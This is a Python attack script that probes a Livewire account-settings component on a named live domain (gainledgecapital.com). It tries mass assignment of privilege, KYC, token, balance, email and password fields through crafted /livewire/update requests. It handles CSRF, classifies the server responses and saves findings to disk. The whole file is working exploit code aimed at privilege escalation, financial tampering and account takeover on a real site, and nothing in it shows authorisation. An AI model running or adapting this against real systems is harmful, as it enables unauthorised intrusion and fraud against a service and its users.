#!/usr/bin/env python3
"""
Probe 3.1 — Hidden-field mass-assignment via Livewire updates path on
user.account-settings.show.

For each attempted update path, we:
  1. Fetch a fresh page → get CSRF + snapshot.
  2. Send POST /livewire/update with `updates: {<path>: <value>}` and NO save call.
     This tests "is the property accessible on the component".
  3. If response 200 with no error, run a second test where we pair the update
     with the page's `saveProfile` method to see if changes persist.
After each persisting attempt, fetch the page again and check the new snapshot.
"""
import sys, json, time, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lw_send import fresh_component, lw_update, fetch_page, get_csrf, find_component

JAR = "cookies_a.txt"
PATH = "/user/account-settings"
COMP = "user.account-settings.show"

# Properties to attempt on the User model via dotted path. Read-only probes
# (no save call paired) — we only persist if the result is "interesting" and
# the user confirms.
TARGETS = [
    # role / privilege
    "user.role",
    "user.is_admin",
    "user.is_staff",
    "user.is_superuser",
    "user.is_super_admin",
    "user.type",
    "user.user_type",
    "user.role_id",
    "user.level",
    "user.tier",
    "user.permissions",
    "user.abilities",
    # verification / kyc
    "user.email_verified_at",
    "user.verified",
    "user.kyc_status",
    "user.kyc_verified",
    "user.is_verified",
    # tokens / secrets
    "user.api_token",
    "user.remember_token",
    # financial
    "user.balance",
    "user.credits",
    "user.subscription_tier",
    "user.account_balance",
    "user.referral_balance",
    # account-takeover
    "user.email",
    "user.password",
    # nested-prop attempts (one level deeper)
    "user.profile.is_admin",
    "user.team.role",
]

def short(s, n=200):
    if not isinstance(s, str): s = str(s)
    return s if len(s) <= n else s[:n] + "..."

def run():
    csrf, raw, parsed = fresh_component(JAR, PATH, COMP)
    print(f"CSRF {csrf[:16]} OK")

    results = []
    for t in TARGETS:
        # NO save call — just an update
        code, p, body = lw_update(JAR, raw,
            updates={t: 1 if "is_" in t or "verified" in t or "balance" in t or "credits" in t else "TESTVAL"},
            calls=[],
            csrf=csrf,
            referer="https://gainledgecapital.com" + PATH)
        # Inspect for errors
        outcome = "?"
        snippet = ""
        if code != 200:
            outcome = f"HTTP {code}"
            snippet = short(body, 300)
        else:
            # Look for error markers
            try:
                pj = json.loads(body)
            except Exception:
                pj = None
            # Common patterns
            if pj and "components" in pj and isinstance(pj["components"], list) and pj["components"]:
                c = pj["components"][0]
                eff = c.get("effects") or {}
                snap_str = c.get("snapshot")
                snap_err = []
                if isinstance(snap_str, str):
                    try:
                        snap_obj = json.loads(snap_str)
                        snap_err = snap_obj.get("memo", {}).get("errors", [])
                    except: pass
                # Check effects.html for error reflection
                html_e = eff.get("html") or ""
                outcome = "200 OK (silent)"
                if snap_err:
                    outcome = f"snap-errors: {snap_err}"
                # Validation messages
                if "These credentials" in html_e or "validation" in (html_e or "").lower():
                    snippet = "validation reflected"
            elif pj and pj.get("message"):
                outcome = f"json-msg: {short(pj.get('message'),120)}"
            elif "Property" in body and "not found" in body:
                outcome = "Property NOT FOUND"
            elif "Column not found" in body:
                outcome = "Column NOT FOUND"
            elif "Method " in body and "not found" in body:
                outcome = "Method NOT FOUND"
            else:
                outcome = "200 (uncategorized)"
            # Save raw response
            os.makedirs("findings/p1_mass_assign", exist_ok=True)
            safe = t.replace(".", "_")
            with open(f"findings/p1_mass_assign/{safe}.json", "w") as f:
                f.write(body)
        results.append((t, code, outcome, snippet))
        print(f"  {t:34s}  HTTP {code}  {outcome}  {snippet}")
        time.sleep(0.6)

    # Save summary
    with open("findings/p1_mass_assign/_summary.json", "w") as f:
        json.dump([{"target": t, "code": c, "outcome": o, "snippet": s}
                   for (t, c, o, s) in results], f, indent=2)
    print("\nDone. Wrote findings/p1_mass_assign/")

if __name__ == "__main__":
    run()
